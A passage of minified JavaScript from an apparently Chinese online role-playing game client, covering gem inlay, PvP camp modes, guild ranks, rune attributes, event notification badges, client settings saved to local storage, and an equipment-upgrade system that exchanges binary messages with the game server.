d=p.skill[h.itemData.getGemLv()-1],c=s.GlobalConfig.GemReviseConfig[d].skill;c==e&&s.GlobalConfig.GemReviseConfig[d]&&s.GlobalConfig.GemReviseSkillConfig[d]&&s.GlobalConfig.GemReviseSkillConfig[d].gemskill>0}}}return 0},e.prototype.hasSuitSkillEff=function(t){var e=Math.floor(t/1e3),i=s.GlobalConfig.GemReviseSkillConfig[e],n=r.SubRoles.ins().getSubRoleByIndex(0);if(i&&n.suitData&&n.suitData.length)for(var o=0;o<n.suitData.length;o++){var a=n.suitData[o];if(-1!=i.revises.indexOf(a)){var l=s.GlobalConfig.GemReviseConfig[n.suitData[o]];if(l)return!0}}return!1},__decorate([post()],e.prototype,"patchGemInfo",null),__decorate([post()],e.prototype,"patchUpgrade",null),__decorate([post()],e.prototype,"patchMakeAHole",null),__decorate([post()],e.prototype,"updateGemInfo",null),__decorate([post()],e.prototype,"viewShowSkill",null),e}(n.BaseSystem);e.EquipInlayCT=c,window.EquipInlayCT=c,__reflect(c.prototype,"EquipInlayCT",[]),Systemap.EquipInlayCT=function(){return c.ins()},window.EquipInlayCT=c},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CampCC=e.CampMode=void 0;var n=i(101),o=i(20),s=i(0),a=i(28),r=i(43),l=function(t){function e(){var e=t.call(this)||this;return e.mode=0,observe(e,function(){e.selectMode(s.GlobalConfig.InstanceConfig[o.GameMap.fubenID].camp||0)},Ts.enterScene.enterOK),e}return __extends(e,t),e.prototype.selectMode=function(t,e){return this.mode=t,send(Ts.selectCamp,t),e},e.prototype.canAtk=function(t){var e=t.infoModel,i=e.guildID,n=e.type,o=e.teamId;if(n==EntityType.Monster)return!0;switch(this.mode){case h.PWACE:return!1;case h.TEAM:return!o||!r.CityCC.ins().isMyTeamNumber(o);case h.GUILD:return!i||i!=a.Guild.ins().guildID;case h.ALL:return!0}},__decorate([post()],e.prototype,"selectMode",null),e}(n.CC);window.campcc=l,__reflect(l.prototype,"campcc",[]);var h;!function(t){t[t.PWACE=0]="PWACE",t[t.GUILD=1]="GUILD",t[t.ALL=2]="ALL",t[t.TEAM=3]="TEAM"}(h=e.CampMode||(e.CampMode={})),window.CampMode=h,e.CampCC=new l,window.CampCC=e.CampCC},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildLanguage=void 0;var n=function(){function t(){}return t.guildOffice=[],t.guildOfficeColor=["d1c3a8","00c832","1694ec","8e2abc","f4b12a","ffff00","ffff00"],t.guildBuilding=[],t}();e.GuildLanguage=n,window.GuildLanguage=n,__reflect(n.prototype,"GuildLanguage",[]),window.GuildLanguage=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildOffice=void 0;var n;!function(t){t[t.GUILD_MEMBER=0]="GUILD_MEMBER",t[t.GUILD_JINGYING=1]="GUILD_JINGYING",t[t.GUILD_TANGZHU=2]="GUILD_TANGZHU",t[t.GUILD_HUFA=3]="GUILD_HUFA",t[t.GUILD_ZHANGLAO=4]="GUILD_ZHANGLAO",t[t.GUILD_FUBANGZHU=5]="GUILD_FUBANGZHU",t[t.GUILD_BANGZHU=6]="GUILD_BANGZHU"}(n=e.GuildOffice||(e.GuildOffice={})),window.GuildOffice=n,window.GuildOffice=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RuneConfigMgr=void 0;var n=i(50),o=i(22),s=i(0),a=i(278),r=i(279),l=i(72),h=i(34),u=function(t){function e(){var e=t.call(this)||this;return e.exchangeList=[],e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.getBaseCfg=function(t,e){void 0===e&&(e=!1);var i=s.GlobalConfig.RuneBaseConfig,n=e?t.configID+1:t.configID;return i[n]},e.prototype.getBaseCfgByItemConfig=function(t){var e=s.GlobalConfig.RuneBaseConfig;return e[t.id]},e.prototype.getLockCfg=function(t){var e=s.GlobalConfig.RuneLockPosConfig;return e[t]},e.prototype.getOtherCfg=function(){var t=s.GlobalConfig.RuneOtherConfig;return t},e.prototype.getcfgAttrData=function(t,i){if(void 0===i&&(i=!0),!t)return"";var n="";return n+=this.getAttrNamesByList(e.getAttrFromCfg(t),0,i),n+=this.getAttrNamesByList(e.getEquipAttr(t),1,i),n+=this.getAttrNamesByList(e.getExAttr(t),2,i),n+=this.getAttrNamesByList(e.getSpecialAttr(t),3,i)},e.prototype.getcfgAttrDataEx=function(t){if(!t)return null;var i=e.getAttrFromCfg(t).concat(e.getEquipAttr(t)).concat(e.getExAttr(t)).concat(e.getSpecialAttr(t));return i},e.prototype.getAttrNamesByList=function(t,i,n){var s="";if(!t||t.length<=0)return"";switch(i){case 0:for(var a in t)if(t[a])if(n){var r=e.isMin(t[a].type)?"":"\n";s+=""+o.AttributeData.getAttrStrByType(t[a].type)+r}else s+=e.isMin(t[a].type)?"+"+(e.isPer(t[a].type)?t[a].value/100:t[a].value):e.isMax(t[a].type)?" - "+(e.isPer(t[a].type)?t[a].value/100+"%":t[a].value)+"\n":"+"+(e.isPer(t[a].type)?t[a].value/100+"%":t[a].value)+"\n";break;case 1:for(var a in t)t[a]&&(s+=n?o.AttributeData.getEEquipAttrStrByType(t[a].type)+"\n":"+"+t[a].value+"%\n");break;case 2:for(var a in t)t[a]&&(s+=n?o.AttributeData.getExtAttrStrByType(t[a].type)+"\n":"+"+t[a].value+"\n");break;case 3:for(var a in t)t[a]&&(s+=n?(1==t[a].type?gettext("金币"):gettext("经验"))+"\n":"+"+t[a].value+"%\n")}return s},e.prototype.getcfgAttrDesc=function(t,i){if(void 0===i&&(i=!1),!t)return"";var n="";return n+=this.getAttrDescByList(e.getAttrFromCfg(t),0,i),n+=this.getAttrDescByList(e.getEquipAttr(t),1,i),n+=this.getAttrDescByList(e.getExAttr(t),2,i),n+=this.getAttrDescByList(e.getSpecialAttr(t),3,i),n.lastIndexOf("\n")==n.length-1&&(n=n.substring(0,n.length-1)),n},e.prototype.getAttr=function(t,i){void 0===i&&(i=0);var n=this.getBaseCfg(t,!!i),o=e.getAttrFromCfg(n).concat(e.getEquipAttr(n)).concat(e.getExAttr(n)).concat(e.getSpecialAttr(n));return o},e.prototype.getAttrDesc=function(t,i){void 0===i&&(i=0);var n=this.getBaseCfg(t,!!i),s=e.getAttrFromCfg(n).concat(e.getEquipAttr(n)).concat(e.getExAttr(n)).concat(e.getSpecialAttr(n));return o.AttributeData.getAttrShowStr(s,":     ")},e.prototype.getAttrDescByList=function(t,i,n){void 0===n&&(n=!1);var s="";if(!t||t.length<=0)return"";switch(i){case 0:for(var a in t)t[a]&&(n?5==t[a].type||(s+=6==t[a].type?gettext("物防、魔防 +{0}\n",t[a].value):e.isMin(t[a].type)?""+o.AttributeData.getAttrNameByAttrbute(t[a],!0," + "):e.isMax(t[a].type)?o.AttributeData.getAttrNameByAttrbute(t[a],!0," - ")+"\n":o.AttributeData.getAttrNameByAttrbute(t[a],!0," + ")+"\n"):s+=e.isMin(t[a].type)?""+o.AttributeData.getAttrNameByAttrbute(t[a],!0," + "):e.isMax(t[a].type)?o.AttributeData.getAttrNameByAttrbute(t[a],!0," - ")+"\n":o.AttributeData.getAttrNameByAttrbute(t[a],!0," + ")+"\n");break;case 1:for(var a in t)t[a]&&(s+=o.AttributeData.getEEquipAttrStrByType(t[a].type)+"  +"+t[a].value+"%\n");break;case 2:for(var a in t)t[a]&&(s+=o.AttributeData.getExAttrNameByAttrbute(t[a])+"\n");break;case 3:for(var a in t)t[a]&&(s+=(1==t[a].type?gettext("金币"):gettext("经验"))+"  +"+t[a].value+"%\n")}return s},e.prototype.getAttrByList=function(t,e,i){void 0===i&&(i=!1);var n="";if(!t||t.length<=0)return"";switch(e){case 0:for(var s in t)t[s]&&(n+=o.AttributeData.getAttrNameByAttrbute(t[s],!0,"：",!1,16298305)+"\n");break;case 1:for(var s in t)t[s]&&(n+=o.AttributeData.getEEquipAttrStrByType(t[s].type)+"：|C:16298305&T:"+t[s].value+"%\n");break;case 2:for(var s in t)if(t[s]){var a=l.AttributeFormat.getFormat(4,0,"：",1,1,l.AttributeFormat.DEFAULT_COLOR,16298305);n+=o.AttributeData.getExAttrNameByAttrbute(t[s],a)+"\n"}break;case 3:for(var s in t)t[s]&&(n+=(1==t[s].type?gettext("金币"):gettext("经验"))+"：|C:16298305&T:"+t[s].value+"%\n")}return n},e.prototype.getExchangeDataList=function(){if(this.exchangeList.length>0)return this.exchangeList;var t=s.GlobalConfig.RuneConverConfig;for(var e in t)this.exchangeList.push(t[e]);return this.exchangeList.sort(this.sortExchange),this.exchangeList},e.prototype.sortExchange=function(t,e){return t.checkpoint<e.checkpoint?-1:t.checkpoint>e.checkpoint?1:t.id-e.id},e.getEquipAttr=function(t){if(!t)return null;for(var e=[],i=0;i<a.EquipAddAttrType.EquipSlotType_Max;i++)if(t["pos"+i]>0){var n=new o.AttributeData;n.type=a.RUNE_POS_ATTR_MIN+i,n.value=t["pos"+i],e.push(n)}return e},e.getAttrFromCfg=function(t){var i=[];for(var n in e.translate)if(!(null==t[n]||t[n]<0)){var s=new o.AttributeData;s.type=parseInt(e.translate[n]),s.value=t[n],i.push(s)}return i},e.isMin=function(t){return t==h.AttributeType.atAtkMin||t==h.AttributeType.atAtkTaoistMin||t==h.AttributeType.atAtkMageMin||t==h.AttributeType.atDef?!0:!1},e.isMax=function(t){return t==h.AttributeType.atAtkMax||t==h.AttributeType.atAtkTaoistMax||t==h.AttributeType.atAtkMageMax||t==h.AttributeType.atRes?!0:!1},e.isPer=function(t){return t==h.AttributeType.atAtkEx||t==h.AttributeType.atDamageReduction||t==h.AttributeType.atCrit||t==h.AttributeType.atTough||t==h.AttributeType.atHpEx||t==h.AttributeType.atMpEx?!1:void 0},e.getExAttr=function(t){if(!t)return null;var e=[];if(t.additionalHarm>0){var i=new o.AttributeData;i.type=r.ExAttributeType.eatNewAdditionalHarm,i.value=t.additionalHarm,e.push(i)}if(t.reductionHarm>0){var i=new o.AttributeData;i.type=r.ExAttributeType.eatNewReductionHarm,i.value=t.reductionHarm,e.push(i)}return e},e.getSpecialAttr=function(t){if(!t)return null;var e=[];if(t.goldAdd>0){var i=new o.AttributeData;i.type=1,i.value=t.goldAdd,e.push(i)}if(t.expAdd>0){var i=new o.AttributeData;i.type=2,i.value=t.expAdd,e.push(i)}return e},e.prototype.getNextCost=function(t){var e=this.getBaseCfg(t),i=this.getBaseCfg(t,!0);return i?i.gain-e.gain:0},e.translate={hp:h.AttributeType.atMaxHp,atMpMax:h.AttributeType.atMp,atAtkMin:h.AttributeType.atAtkMin,atAtkMax:h.AttributeType.atAtkMax,atAtkTaoistMin:h.AttributeType.atAtkTaoistMin,atAtkTaoistMax:h.AttributeType.atAtkTaoistMax,atAtkMageMin:h.AttributeType.atAtkMageMin,atAtkMageMax:h.AttributeType.atAtkMageMax,def:h.AttributeType.atDef,res:h.AttributeType.atRes,atAtkEx:h.AttributeType.atShanghaiJiaShen,atDamageReduction:h.AttributeType.atDamageReduction,atCrit:h.AttributeType.atCrit,atTough:h.AttributeType.atTough,atHpEx:h.AttributeType.atHpEx,atMpEx:h.AttributeType.atMpEx,addAccuracy:h.AttributeType.addAccuracy,addEvade:h.AttributeType.addEvade},e}(n.BaseClass);e.RuneConfigMgr=u,window.RuneConfigMgr=u,__reflect(u.prototype,"RuneConfigMgr",[]),window.RuneConfigMgr=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HegemonyRedPoint=void 0;var n=i(14),o=i(4),s=i(152),a=i(26),r=i(46),l=function(t){function e(){var e=t.call(this)||this;return e.redpoint1=0,e.redpoint2=0,e.redpoint3=0,e.redpoint=0,observe(e,e.postRedPoint,r.HegemonyCT.ins().postInit,r.HegemonyCT.ins().postSignup,r.HegemonyCT.ins().postVote,r.HegemonyCT.ins().postChallenge,r.HegemonyCT.ins().postState,r.HegemonyCT.ins().postWorship,a.ZsCT.ins().postZsLv,s.CompassCT.ins().postGetRewardInfo,s.CompassCT.ins().postCompassInfo,s.CompassCT.ins().postRewardResult),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.postRedPoint=function(){this.redpoint1=0,this.redpoint2=0,this.redpoint3=0,this.redpoint=0;var t=r.HegemonyCT.ins();if(!t.isOpen())return this.redpoint;t.state==r.HegemonyStatus.SignUp&&0==t.isSignup?this.redpoint1=1:t.state==r.HegemonyStatus.Vote&&0==t.isVote&&t.voteData.length>0?this.redpoint1=1:t.state==r.HegemonyStatus.Challenge&&t.challengeData[0]&&(t.challengeData[0].state<r.HegemonyStatus.SignUp&&t.challengeData[0].challenger==o.ActorCC.actorID||t.challengeData[0].state>r.HegemonyStatus.SignUp&&t.cFirstTap)?this.redpoint1=1:t.state==r.HegemonyStatus.Knockout&&t.delegate==o.ActorCC.actorID&&t.oFirstTap?this.redpoint1=1:t.state>r.HegemonyStatus.Knockout&&t.state<r.HegemonyStatus.Over&&t.isChange&&0==t.battleEnd&&(this.redpoint1=1),t.state>r.HegemonyStatus.Finals&&t.pFirstTap,t.state>r.HegemonyStatus.Finals&&t.leftWordship&&t.serverId&&t.player&&(this.redpoint3=1);var e=s.CompassCT.ins().getRewardRedpoint();return this.redpoint=this.redpoint1+this.redpoint2+this.redpoint3+e,this.redpoint},__decorate([post()],e.prototype,"postRedPoint",null),e}(n.BaseSystem);e.HegemonyRedPoint=l,window.HegemonyRedPoint=l,__reflect(l.prototype,"HegemonyRedPoint",[]),Systemap.HegemonyRedPoint=function(){return l.ins()},window.HegemonyRedPoint=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CostComRender=void 0;var n=i(24),o=i(3),s=i(0),a=i(36),r=i(4),l=i(6),h=i(245),u=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="CostComSkin",e.mIsShowXh=!0,e.mIsShowHas=!0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.dataChanged(),this.addTouchEndEvent(this.icon,this.onClick)},e.prototype.dataChanged=function(){if(this._info=this.data,this.skin&&this._info){this.mCost=this._info.cost,this.mIsShowXh=this._info.isShowXh||!0,this.mIsShowHas=this._info.isShowHas||!0,this.cost=this._info.cost,this.LabXh.visible=this._info.isShowXh,this.LabXh.text=this._info.isShowXh?gettext("消耗:"):"";var t=0;switch(this.mCost.id){case a.MoneyConst.gold:case a.MoneyConst.yuanbao:this.icon.source=s.GlobalConfig.MoneyConfig[this.mCost.id].icon,t=this.mCost.id==a.MoneyConst.gold?r.ActorCC.gold:r.ActorCC.yb;break;default:var e=s.GlobalConfig.ItemConfig[this.mCost.id];this.icon.source=e?RES_DIR_ITEMICON+e.icon+".png":"",t=this.mIsShowHas?l.BagCT.ins().getBagGoodsCountById(l.BagCT.BAG_TYPE_OTHTER,this.mCost.id)||0:0}var i=this.mCost.count||0,o=t>=i?2149168:16720161;this.countLabel.textFlow=this.mIsShowHas?(new egret.HtmlTextParser).parser('<font color="'+o+'"> '+n.CommonUtils.overLength(t)+"</font>/"+n.CommonUtils.overLength(i)):(new egret.HtmlTextParser).parser(""+i)}},e.prototype.onClick=function(t){if(r.ActorCC.isLocation&&this.cost)switch(t.currentTarget){case this.icon:var e=s.GlobalConfig.ItemConfig[this.cost.id];if(!e)return;win.open(h.ItemDetailedWin,0,e.id,this.cost.count||1)}},e}(o.BaseItemRender);e.CostComRender=u,window.CostComRender=u,__reflect(u.prototype,"CostComRender",[]),window.CostComRender=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HuntWarnBuyWin=void 0;var n=i(5),o=i(1),s=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="WarnBuySkin",e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.panel=t[0],this.callback=t[1],this.des=t[2],this.addTouchEndEvent(this,this.onTouch),this.update()},e.prototype.removeDisplay=function(){this.panel=null,this.callback=null,this.removeTouchEvent(this,this.onTouch)},e.showBuyWarn=function(t,i,n){1==e.loginRecords[t]?i&&i():win.open("HuntWarnBuyWin",t,i,n)},e.prototype.update=function(){this.tipsCheckbox.selected=!1,this.desTxt.textFlow=n.TextFlowMaker.generateTextFlow(this.des)},e.prototype.onTouch=function(t){switch(t.target){case this.noBtn:win.close(this);break;case this.yesBtn:e.loginRecords[this.panel]=this.tipsCheckbox.selected,this.callback&&this.callback(),win.close(this)}},e.loginRecords={},e}(o.BaseView);e.HuntWarnBuyWin=s,window.HuntWarnBuyWin=s,__reflect(s.prototype,"HuntWarnBuyWin",[]),window.HuntWarnBuyWin=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.SysSetting=void 0;var n=i(50),o=i(69),s=i(16),a=i(4),r=i(195),l=i(91),h=i(85),u=i(53),p=function(t){function e(){var i=t.call(this)||this;return i.newSave={},i.newSave1={},i._storage={},i.defaultValue={sound_effect:1,shake_win:1,auto_heji:0,dice:0,barrage:1,hp:1,mp:1,sp:1},i.newSave1[h.ClientSet.SETTING_HP]=e.HP,i.newSave1[h.ClientSet.SETTING_HP_PERCENT]=e.HP_NUM,i.newSave1[h.ClientSet.SETTING_HP_ITEM]=e.HP_ITEM,i.newSave1[h.ClientSet.SETTING_MP]=e.MP,i.newSave1[h.ClientSet.SETTING_MP_PERCENT]=e.MP_NUM,i.newSave1[h.ClientSet.SETTING_MP_ITEM]=e.MP_ITEM,i.newSave1[h.ClientSet.SETTING_SP]=e.SP,i.newSave1[h.ClientSet.SETTING_SP_PERCENT]=e.SP_NUM,i.newSave1[h.ClientSet.SETTING_SP_ITEM]=e.SP_ITEM,observe(i,i.init,h.Setting.ins().postInitSetting),i}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.setItem=function(t,i){return this.newSave[t]?void h.Setting.ins().setValue(this.newSave[t],i):void(this._storage[t]!=i&&(this._storage[t]=i,t==e.SOUND_EFFECT?o.SoundUtil.enable=this.getBool(t):t==e.SHAKE_WIN?s.DisplayUtils.setShakeOn(this.getBool(t)):t==e.FIGTHING_EFF?u.ControlCC.isHideFightingEff=this.getBool(t):t==e.BLOOD_EFF?u.ControlCC.isHideBloodEff=this.getBool(t):t==e.GAME_FRAME_RATE?u.ControlCC.gameFrameRate=this.getValue(t):t==e.AUTO_SEL_HIGH_QUALITY_MON?u.ControlCC.isAutoSelHighQuaMon=this.getBool(t):t==e.WING_EFF?(u.ControlCC.isHideWingEff=this.getBool(t),a.ActorCC.postUpdateWing(),a.ActorCC.postUpdateOtherWing(),a.ActorCC.postUpdateDemonCir(),a.ActorCC.postUpdateLongGas(),a.ActorCC.postUpdateGodCrown()):t==e.HIDE_NOTICE_KILL_DROP&&(u.ControlCC.isHideNoticeKillDrop=this.getBool(t)),Timer.has(this.storage,this)||egret.callLater(this.storage,this)))},e.prototype.getItem=function(t){return this.newSave[t]?h.Setting.ins().getValue(this.newSave[t]):this._storage[t]},e.prototype.setBool=function(t,e){this.setItem(t,e?1:0)},e.prototype.getBool=function(t){return!!this.getItem(t)},e.prototype.setValue=function(t,e){this.setItem(t,e)},e.prototype.getValue=function(t){return this.getItem(t)},e.prototype.init=function(){try{var t=getLocation(this.getStorageKey());t?this._storage=JSON.parse(t)||{}:this._storage={}}catch(e){console.log(e),this._storage={}}this.initValue()},e.prototype.initValue=function(){this.newSave[e.HP]=h.ClientSet.SETTING_HP,this.newSave[e.HP_NUM]=h.ClientSet.SETTING_HP_PERCENT,this.newSave[e.HP_ITEM]=h.ClientSet.SETTING_HP_ITEM,this.newSave[e.MP]=h.ClientSet.SETTING_MP,this.newSave[e.MP_NUM]=h.ClientSet.SETTING_MP_PERCENT,this.newSave[e.MP_ITEM]=h.ClientSet.SETTING_MP_ITEM,this.newSave[e.SP]=h.ClientSet.SETTING_SP,this.newSave[e.SP_NUM]=h.ClientSet.SETTING_SP_PERCENT,this.newSave[e.SP_ITEM]=h.ClientSet.SETTING_SP_ITEM;for(var t in this.defaultValue)this.newSave[t]?h.Setting.ins().setValue(this.newSave[t],this.defaultValue[t]):void 0==this._storage[t]&&(this._storage[t]=this.defaultValue[t]);o.SoundUtil.enable=this.getBool(e.SOUND_EFFECT),u.ControlCC.isHideFightingEff=this.getBool(e.FIGTHING_EFF),u.ControlCC.isHideBloodEff=this.getBool(e.BLOOD_EFF),u.ControlCC.isAutoSelHighQuaMon=this.getBool(e.AUTO_SEL_HIGH_QUALITY_MON),u.ControlCC.isHideWingEff=this.getBool(e.WING_EFF),u.ControlCC.isHideNoticeKillDrop=this.getBool(e.HIDE_NOTICE_KILL_DROP);var i=this.getValue(e.GAME_FRAME_RATE);i?u.ControlCC.gameFrameRate=i:this.setValue(e.GAME_FRAME_RATE,38),s.DisplayUtils.setShakeOn(this.getBool(e.SHAKE_WIN)),this.initSet()},e.prototype.initSet=function(){this.getValue(e.HP_NUM)||this.setValue(e.HP_NUM,r.MainPotCC.Dv),this.getValue(e.MP_NUM)||this.setValue(e.MP_NUM,r.MainPotCC.Dv),this.getValue(e.SP_NUM)||this.setValue(e.SP_NUM,r.MainPotCC.Dv),this.getValue(e.HP_ITEM)||this.setValue(e.HP_ITEM,l.ItemConst.HP_ITEM1),this.getValue(e.MP_ITEM)||this.setValue(e.MP_ITEM,l.ItemConst.MP_ITEM1),this.getValue(e.SP_ITEM)||this.setValue(e.SP_ITEM,l.ItemConst.SP_ITEM1),this.getValue(e.BAG_NUM7)||this.setValue(e.BAG_NUM7,0)},e.prototype.storage=function(){try{var t=JSON.stringify(this._storage);setLocation(this.getStorageKey(),t)}catch(e){}},e.prototype.getStorageKey=function(){return a.ActorCC.actorID+""||"game_longlin"},e.prototype.setRecoverItem=function(){},e.SOUND_EFFECT="sound_effect",e.FIGTHING_EFF="fighting_eff",e.BLOOD_EFF="blood_eff",e.GAME_FRAME_RATE="gameFrameRate",e.SHAKE_WIN="shake_win",e.BARRAGE="barrage",e.HP="hp",e.HP_NUM="hp_num",e.HP_ITEM="hp_item",e.MP="mp",e.MP_NUM="mp_num",e.MP_ITEM="mp_item",e.SP="sp",e.SP_NUM="sp_num",e.SP_ITEM="sp_item",e.BAG_NUM7="bag_num7",e.WING_EFF="wing_eff",e.HIDE_NOTICE_KILL_DROP="hide_notice_kill_drop",e.AUTO_SEL_HIGH_QUALITY_MON="AUTO_SEL_HIGH_QUALITY_MON",__decorate([post()],e.prototype,"setRecoverItem",null),e}(n.BaseClass);e.SysSetting=p,window.SysSetting=p,__reflect(p.prototype,"SysSetting",[]),window.SysSetting=p,Systemap.SysSetting=function(){return p.ins()}},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TunTianEquipSystem=void 0;var n=i(8),o=i(19),s=i(14),a=i(17),r=i(0),l=i(13),h=i(6),u=i(23),p=i(326),d=i(694),c=function(t){function e(){var e=t.call(this)||this;return e.rp=new a.RedPoint,e.lvUpRp=[],e.inited=!1,e.info={},e.power={},e.tunsiInfo=[],e.SUIT_MAX=10,e.sysId=PackageID.Equip,e.regNetMsg(84,e.postInfo),e.regNetMsg(85,e.postActBack),e.regNetMsg(86,e.postBossQuickFinish),e.regNetMsg(87,e.postJubianBack),e.regNetMsg(88,e.postLvUpBack),e.regNetMsg(89,e.postTunsiInfo),e.regNetMsg(90,e.postHuanHua),e.regNetMsg(91,e.postSettle),e.observe(u.GameLogic.ins().postSubRoleChange,e.theClentInitInfo),e.observe(u.GameLogic.ins().postSubRoleChange,e.addRole),e.initRps(),e}return __extends(e,t),e.prototype.postInfo=function(t){for(var e=t.readByte(),i=0;e>i;i++){var n=t.readByte(),o=t.readInt();this.power[n]=o;var s=this.info[n]||{};this.info[n]=s;for(var a=t.readByte(),r=0;a>r;r++){var l=new p.TunTianData;l.role=n,l.parse(t),s[l.pos]=l}}this.theClentInitInfo()},e.prototype.postActBack=function(t){var e=t.readByte(),i=t.readByte();console.log("激活返回");var n=this.info[e]&&this.info[e][i];return n&&(n.lv=1,n.act=!0,n.updateCost()),n.pos},e.prototype.postBossQuickFinish=function(t){var e=t.readByte(),i=t.readByte(),o=t.readByte();if(1==e){var s=t.readInt();s>0&&(s=n.DateUtils.formatMiniDateTime(s),this.tunsiInfo[0]&&(this.tunsiInfo[0].endtime=s))}else if(2==e||3==e){var a=t.readInt(),r=t.readInt();this.power[i]=r,this.info[i]&&this.info[i][o]&&(this.info[i][o].tuntianval=a)}},e.prototype.addRole=function(){this.theClentInitInfo(!0)},e.prototype.theClentInitInfo=function(t){if(void 0===t&&(t=!1),r.GlobalConfig.TunTianLevelUp&&(!this.inited||t)){for(var e=3,i=0;e>i;i++){var n=i,o=l.SubRoles.ins().getSubRoleByIndex(i);if(o){var s=this.info[n]||{};this.info[n]=s;for(var a=this.SUIT_MAX,h=0;a>h;h++)if(!s[h]){var u=new p.TunTianData;u.role=n,u.clinetInfo(n,h),s[u.pos]=u}}}this.inited=!0}},e.prototype.postTunsiInfo=function(t){var e=t.readByte();this.tunsiInfo=[];for(var i=0;e>i;i++){var n=new p.TunsiData;n.parase(t),this.tunsiInfo.push(n)}return 1},e.prototype.sendAct=function(t,e){var i=this.getBytes(85);i.writeByte(t),i.writeByte(e),this.sendToServer(i)},e.prototype.sendTunsi=function(t){var e=this.getBytes(86);e.writeByte(t),this.sendToServer(e)},e.prototype.sendJubain=function(t,e){var i=this.getBytes(87);i.writeByte(t),i.writeByte(e),this.sendToServer(i)},e.prototype.postJubianBack=function(t){var e=t.readByte(),i=t.readByte(),n=t.readInt(),o=t.readInt(),s=this.info[e]&&this.info[e][i];if(this.power[e]=o,s){s.jubian.lv=n;var a=r.GlobalConfig.TunTianChangeConf[i]&&r.GlobalConfig.TunTianChangeConf[i][n],l=r.GlobalConfig.TunTianLevelUp[i]&&r.GlobalConfig.TunTianLevelUp[i][s.lv];return a&&l&&(s.tunsiMax=l.tunshiNum+(a&&a.expnum||0)),s}},e.prototype.sendLvUp=function(t,e){var i=this.getBytes(88);i.writeByte(t),i.writeByte(e),this.sendToServer(i)},e.prototype.useShow=function(t,e,i){var n=this.getBytes(90);n.writeBoolean(t),n.writeByte(e),n.writeByte(i),this.sendToServer(n)},e.prototype.postHuanHua=function(t){var e=t.readBoolean(),i=t.readByte(),n=t.readByte();return this.info[i]&&(this.info[i][n].isShow=e),n},e.prototype.postSettle=function(t){var e=t.readInt(),i=t.readByte(),n=t.readByte();d.TunTianSettleTips.open(i,n,e)},e.prototype.postLvUpBack=function(t){var e=t.readByte(),i=t.readByte(),n=t.readInt(),o=t.readInt();console.log("升级返回");var s=this.info[e]&&this.info[e][i];return s&&(s.lv=n,s.act=!0,this.power[e]=o,s.lvCfg=r.GlobalConfig.TunTianLevelUp[i][n],s.updateCost()),s.pos},e.prototype.getActivtCount=function(t){var e=0,i=this.info[t];if(i)return e;for(var n in i){var o=i[n];o.act&&(e+=1)}return e},e.prototype.getLvCount=function(t,e){var i=0,n=this.info[t];if(!n)return i;for(var o in n){var s=n[o];s.act&&s.lv>=e&&(i+=1)}return i},e.ins=function(){return t.ins.call(this)},e.prototype.postRedPoint=function(){},e.prototype.initRps=function(){var t=this;this.rp=new a.RedPoint(function(){return t.checkRed()},this.postRedPoint);for(var e=function(e){i.lvUpRp[e]=new a.RedPoint(function(){var i=t.checkLvUpRed(e);return t.postRedPoint(),i},i.postInfo,i.postActBack,i.postLvUpBack,h.BagCT.ins().postItemAdd,h.BagCT.ins().postItemCountChange,h.BagCT.ins().postItemDel)},i=this,n=0;n<this.SUIT_MAX;n++)e(n)},e.prototype.checkRed=function(){for(var t in this.lvUpRp)if(this.lvUpRp[t]&&1==this.lvUpRp[t].v)return!0;return!1},e.prototype.checkLvUpRed=function(t){var e=this.info[0];if(!e)return!1;var i=e[t],n=i.bayeLvOpen();if(!n||!n.isOpen)return!1;var s=!0;if(i.act){var a=r.GlobalConfig.TunTianLevelUp[t]&&r.GlobalConfig.TunTianLevelUp[t][i.lv+1];if(!a)return!1;for(var l in a.cost)if(!o.GlobalFun.checkCost(a.cost[l].count,a.cost[l].id,"",!1)){s=!1;break}}else{var h=r.GlobalConfig.TunTianSetConf[0]&&r.GlobalConfig.TunTianSetConf[0][t];for(var l in h.cost)if(!o.GlobalFun.checkCost(h.cost[l].count,h.cost[l].id,"",!1)){s=!1;break}}return s},e.prototype.checkJubianRedPoint=function(t,e,i){},e.prototype.otherSystemParam=function(t,e,i){void 0===i&&(i=!1);var n=r.GlobalConfig.TunTianLevelUp[t]&&r.GlobalConfig.TunTianLevelUp[t][e||1];if(!n)return[];var o=[];for(var s in n.attr_precent){var a=n.attr_precent[s],l=void 0;l=i?a/100+"%":this.getEquipName(Number(s),t)+ +a/100+"%",o.push(l)}return o},e.prototype.getEquipName=function(t,e){var i=[],n=[gettext("噬魔装备"),gettext("至尊装备"),gettext("传世装备"),gettext(""),gettext("无双装备")];return 0==t?i=r.GlobalConfig.TunTianBaseConf.tuntian:1==t?i=r.GlobalConfig.TunTianBaseConf.zhizun:2==t?i=r.GlobalConfig.TunTianBaseConf.heirloom:4==t&&(i=r.GlobalConfig.TunTianBaseConf.peerless),i[e]?n[t]+i[e]:""},__decorate([post()],e.prototype,"postInfo",null),__decorate([post()],e.prototype,"postActBack",null),__decorate([post()],e.prototype,"postBossQuickFinish",null),__decorate([post()],e.prototype,"postTunsiInfo",null),__decorate([post()],e.prototype,"postJubianBack",null),__decorate([post()],e.prototype,"postHuanHua",null),__decorate([post()],e.prototype,"postSettle",null),__decorate([post()],e.prototype,"postLvUpBack",null),__decorate([post()],e.prototype,"postRedPoint",null),e}(s.BaseSystem);e.TunTianEquipSystem=c,window.TunTianEquipSystem=c,__reflect(c.prototype,"TunTianEquipSystem",[]);var 